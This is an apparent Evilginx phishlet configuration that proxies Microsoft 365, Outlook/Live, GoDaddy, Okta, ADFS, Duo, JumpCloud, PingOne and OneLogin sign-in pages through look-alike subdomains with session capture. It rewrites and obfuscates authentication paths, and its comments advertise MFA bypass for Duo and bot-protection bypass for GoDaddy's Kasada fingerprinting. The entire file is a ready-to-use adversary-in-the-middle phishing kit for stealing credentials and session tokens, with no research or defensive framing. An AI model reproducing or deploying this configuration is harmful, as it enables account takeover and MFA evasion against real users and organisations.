name: "o365"
author: "Christ-Link"
min_ver: "3.0.0"

# =========================================================================
# FEDERATION PROVIDER PARAMS (Optional - set to enable provider support)
# =========================================================================
# By default this phishlet works as a standard O365 phishlet.
# Set params to activate federation provider bypass:
#
#   phishlets param o365 okta_org <org_name>     # Okta (e.g., contoso)
#   phishlets param o365 adfs_sub <subdomain>     # ADFS subdomain (e.g., sts, adfs)
#   phishlets param o365 adfs_domain <domain>     # ADFS domain (e.g., contoso.com)
#   phishlets param o365 duo_api <api_host>       # Duo API (e.g., api-a1b2c3d4)
#   phishlets param o365 duo_sso <sso_host>       # Duo SSO (e.g., sso-a1b2c3d4.sso)
#
params:
  - name: okta_org
    default: 'disabled'
  - name: adfs_sub
    default: 'disabled'
  - name: adfs_domain
    default: 'disabled.local'
  - name: duo_api
    default: 'disabled'
  - name: duo_sso
    default: 'disabled'

rewrite_urls:
  - trigger:
      domains: ['login.microsoftonline.com']
      paths: ['/common/oauth2/v2.0/authorize']
    rewrite:
      path: '/oauth'
      query:
        - key: 'tid'
          value: '{id}'
  # Personal Microsoft accounts (Hotmail, Outlook, Live) use login.live.com
  - trigger:
      domains: ['login.live.com']
      paths: ['/oauth20_authorize.srf']
    rewrite:
      path: '/oauth'
      query:
        - key: 'tid'
          value: '{id}'
  # Alternative personal account paths
  - trigger:
      domains: ['login.live.com']
      paths: ['/oauth20_authorize']
    rewrite:
      path: '/oauth'
      query:
        - key: 'tid'
          value: '{id}'
  - trigger:
      domains: ['login.live.com']
      paths: ['/ppsecure/post.srf']
    rewrite:
      path: '/auth'
      query:
        - key: 'tid'
          value: '{id}'
  # GoDaddy SSO - OAuth/SAML flows
  - trigger:
      domains: ['sso.godaddy.com']
      paths: ['/login', '/authorize', '/oauth/authorize', '/saml2/idp/SSOService.php']
    rewrite:
      path: '/sso'
      query:
        - key: 'tid'
          value: '{id}'
  - trigger:
      domains: ['idp.godaddy.com']
      paths: ['/login', '/authorize', '/oauth/authorize', '/saml2/idp/SSOService.php']
    rewrite:
      path: '/idp'
      query:
        - key: 'tid'
          value: '{id}'
  - trigger:
      domains: ['login.godaddy.com']
      paths: ['/login', '/authorize', '/oauth/authorize', '/signin']
    rewrite:
      path: '/gd'
      query:
        - key: 'tid'
          value: '{id}'
  # SecureServer.net SSO - GoDaddy backend
  - trigger:
      domains: ['sso.secureserver.net']
      paths: ['/login', '/authorize', '/oauth/authorize', '/saml2/idp/SSOService.php']
    rewrite:
      path: '/ss'
      query:
        - key: 'tid'
          value: '{id}'
  - trigger:
      domains: ['idp.secureserver.net']
      paths: ['/login', '/authorize', '/oauth/authorize']
    rewrite:
      path: '/ssi'
      query:
        - key: 'tid'
          value: '{id}'
  - trigger:
      domains: ['login.secureserver.net']
      paths: ['/login', '/authorize', '/signin']
    rewrite:
      path: '/ssl'
      query:
        - key: 'tid'
          value: '{id}'
  - trigger:
      domains: ['auth.secureserver.net']
      paths: ['/login', '/authorize', '/oauth/authorize']
    rewrite:
      path: '/ssa'
      query:
        - key: 'tid'
          value: '{id}'
  # =========================================================================
  # OKTA - Obfuscate auth landing paths
  # =========================================================================
  - trigger:
      domains: ['{okta_org}.okta.com']
      paths: ['/login/login.htm', '/login/token/redirect', '/oauth2/v1/authorize', '/oauth2/default/v1/authorize']
    rewrite:
      path: '/ok'
      query:
        - key: 'tid'
          value: '{id}'
  # =========================================================================
  # ADFS - Obfuscate WS-Fed and OAuth2 auth paths
  # =========================================================================
  - trigger:
      domains: ['{adfs_sub}.{adfs_domain}']
      paths: ['/adfs/ls/', '/adfs/ls/wia', '/adfs/oauth2/authorize', '/adfs/ls/IdpInitiatedSignOn.aspx']
    rewrite:
      path: '/ad'
      query:
        - key: 'tid'
          value: '{id}'
  # =========================================================================
  # DUO SECURITY - Obfuscate Universal Prompt and SSO paths
  # =========================================================================
  - trigger:
      domains: ['{duo_api}.duosecurity.com']
      paths: ['/frame/frameless/v4/auth', '/frame/v4/auth/prompt', '/frame/v4/auth']
    rewrite:
      path: '/du'
      query:
        - key: 'tid'
          value: '{id}'
  - trigger:
      domains: ['{duo_sso}.duosecurity.com']
      paths: ['/saml2/sp/sso', '/login']
    rewrite:
      path: '/ds'
      query:
        - key: 'tid'
          value: '{id}'
  # =========================================================================
  # JUMPCLOUD - Obfuscate SAML SSO paths
  # =========================================================================
  - trigger:
      domains: ['sso.jumpcloud.com']
      paths: ['/login', '/saml2/auth']
    rewrite:
      path: '/jc'
      query:
        - key: 'tid'
          value: '{id}'
  # =========================================================================
  # PINGONE - Obfuscate authorize and SAML paths
  # =========================================================================
  - trigger:
      domains: ['auth.pingone.com']
      paths: ['/authorize', '/as/authorize']
    rewrite:
      path: '/pg'
      query:
        - key: 'tid'
          value: '{id}'
  # =========================================================================
  # ONELOGIN - Obfuscate trust/auth paths
  # =========================================================================
  - trigger:
      domains: ['app.onelogin.com']
      paths: ['/login', '/trust/saml2/launch', '/trust/wsfed/launch', '/access/auth']
    rewrite:
      path: '/ol'
      query:
        - key: 'tid'
          value: '{id}'
  - trigger:
      domains: ['login.onelogin.com']
      paths: ['/login', '/trust/saml2/launch', '/trust/wsfed/launch']
    rewrite:
      path: '/oll'
      query:
        - key: 'tid'
          value: '{id}'
  # =========================================================================
  # OUTLOOK.LIVE.COM - Personal account landing paths
  # =========================================================================
  - trigger:
      domains: ['outlook.live.com']
      paths: ['/owa/', '/mail/', '/owa/auth/logon.aspx']
    rewrite:
      path: '/lv'
      query:
        - key: 'tid'
          value: '{id}'

proxy_hosts:
  - { phish_sub: "secure", orig_sub: "login", domain: "microsoftonline.com", session: true, is_landing: false, auto_filter: false }
  - { phish_sub: "billing", orig_sub: "www", domain: "office.com", session: true, is_landing: true, auto_filter: false }
  - { phish_sub: "hervw", orig_sub: "account", domain: "microsoft.com", session: true, is_landing: false, auto_filter: false }
  - { phish_sub: "hervw2", orig_sub: "privacynotice.account", domain: "microsoft.com", session: true, is_landing: false, auto_filter: true }
  - { phish_sub: "hcwdg", orig_sub: "o", domain: "okta.com", session: true, is_landing: false, auto_filter: false }
  - { phish_sub: "hterw", orig_sub: "login", domain: "okta.com", session: true, is_landing: false, auto_filter: false }
  - { phish_sub: "hrvetbr", orig_sub: "login", domain: "live.com", session: true, is_landing: false, auto_filter: false }
  - { phish_sub: "hnrvrve", orig_sub: "account", domain: "live.com", session: true, is_landing: false, auto_filter: false }
  - { phish_sub: "hvr34gr", orig_sub: "outlook", domain: "live.com", session: true, is_landing: false, auto_filter: true }
#
  - { phish_sub: "jrhte", orig_sub: "aadcdn", domain: "msauth.net", session: true, is_landing: false }
  - { phish_sub: "htejre", orig_sub: "aadcdn", domain: "msftauth.net", session: true, is_landing: false }
#
  - { phish_sub: "owa", orig_sub: "outlook", domain: "office.com", session: false, is_landing: true, auto_filter: false }
  - { phish_sub: "mejeff", orig_sub: "outlook", domain: "office365.com", session: true, is_landing: false, auto_filter: false }
  - { phish_sub: "ewfweo", orig_sub: "go", domain: "microsoft.com", session: true, is_landing: false, auto_filter: false }
  - { phish_sub: "roweri", orig_sub: "login", domain: "microsoft.com", session: true, is_landing: false, auto_filter: false }
  # -------------------------------------------------------------------------
  # GODADDY SSO - Full federated auth support (from office.yaml)
  # -------------------------------------------------------------------------
  - {phish_sub: 'sso', orig_sub: 'sso', domain: 'godaddy.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'idp', orig_sub: 'idp', domain: 'godaddy.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'login', orig_sub: 'login', domain: 'godaddy.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'account', orig_sub: 'account', domain: 'godaddy.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'mya', orig_sub: 'mya', domain: 'godaddy.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'gui', orig_sub: 'gui', domain: 'godaddy.com', session: false, is_landing: false, auto_filter: true}
  - {phish_sub: 'csp', orig_sub: 'csp', domain: 'godaddy.com', session: false, is_landing: false, auto_filter: false}
  - {phish_sub: 'events-api', orig_sub: 'events.api', domain: 'godaddy.com', session: false, is_landing: false, auto_filter: true}
  # WSIMG CDN - img6 is the primary observed CDN
  - {phish_sub: 'img1', orig_sub: 'img1', domain: 'wsimg.com', session: false, is_landing: false, auto_filter: false}
  - {phish_sub: 'img6', orig_sub: 'img6', domain: 'wsimg.com', session: false, is_landing: false, auto_filter: false}
  # SecureServer.net - GoDaddy's authentication backend
  - {phish_sub: 'sso-ss', orig_sub: 'sso', domain: 'secureserver.net', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'idp-ss', orig_sub: 'idp', domain: 'secureserver.net', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'login-ss', orig_sub: 'login', domain: 'secureserver.net', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'auth-ss', orig_sub: 'auth', domain: 'secureserver.net', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'csp-ss', orig_sub: 'csp', domain: 'secureserver.net', session: false, is_landing: false, auto_filter: false}
  # Kasada Fingerprint - CRITICAL for bot protection bypass
  - {phish_sub: 'g-sst', orig_sub: 'g.sst', domain: 'godaddy.com', session: false, is_landing: false, auto_filter: true}
  # CDN
  - {phish_sub: 'cdn', orig_sub: 'logincdn', domain: 'msauth.net', session: true, is_landing: false, auto_filter: true}
  # =========================================================================
  # OKTA - Federation support (set 'okta_org' param to enable)
  # When disabled (default), proxy_host resolves to disabled.okta.com (inert)
  # =========================================================================
  - {phish_sub: 'okta', orig_sub: '{okta_org}', domain: 'okta.com', session: true, is_landing: false, auto_filter: true}
  # Okta CDN - Shared (always active for any Okta federation)
  - {phish_sub: 'ok14cdn', orig_sub: 'ok14static', domain: 'oktacdn.com', session: false, is_landing: false, auto_filter: true}
  - {phish_sub: 'ok9cdn', orig_sub: 'ok9static', domain: 'oktacdn.com', session: false, is_landing: false, auto_filter: true}
  # =========================================================================
  # ADFS - Federation support (set 'adfs_sub' + 'adfs_domain' params)
  # When disabled (default), resolves to disabled.disabled.local (inert)
  # =========================================================================
  - {phish_sub: 'adfs', orig_sub: '{adfs_sub}', domain: '{adfs_domain}', session: true, is_landing: false, auto_filter: true}
  # =========================================================================
  # DUO SECURITY - MFA bypass (set 'duo_api' and/or 'duo_sso' params)
  # When disabled (default), resolves to disabled.duosecurity.com (inert)
  # =========================================================================
  - {phish_sub: 'duo-api', orig_sub: '{duo_api}', domain: 'duosecurity.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'duo-sso', orig_sub: '{duo_sso}', domain: 'duosecurity.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'duo-static', orig_sub: 'static', domain: 'duosecurity.com', session: false, is_landing: false, auto_filter: true}
  # =========================================================================
  # JUMPCLOUD - Shared domain (always active, no params needed)
  # =========================================================================
  - {phish_sub: 'jc-sso', orig_sub: 'sso', domain: 'jumpcloud.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'jc-auth', orig_sub: 'auth', domain: 'jumpcloud.com', session: true, is_landing: false, auto_filter: true}
  # =========================================================================
  # PINGONE CLOUD - Shared domain (always active, no params needed)
  # =========================================================================
  - {phish_sub: 'ping-auth', orig_sub: 'auth', domain: 'pingone.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'ping-assets', orig_sub: 'assets', domain: 'pingone.com', session: false, is_landing: false, auto_filter: true}
  # =========================================================================
  # ONELOGIN - Shared endpoints (always active, no params needed)
  # =========================================================================
  - {phish_sub: 'ol-app', orig_sub: 'app', domain: 'onelogin.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'ol-login', orig_sub: 'login', domain: 'onelogin.com', session: true, is_landing: false, auto_filter: true}
  # =========================================================================
  # AUTH0 - Shared CDN (always active, no params needed)
  # =========================================================================
  - {phish_sub: 'a0-cdn', orig_sub: 'cdn', domain: 'auth0.com', session: false, is_landing: false, auto_filter: true}

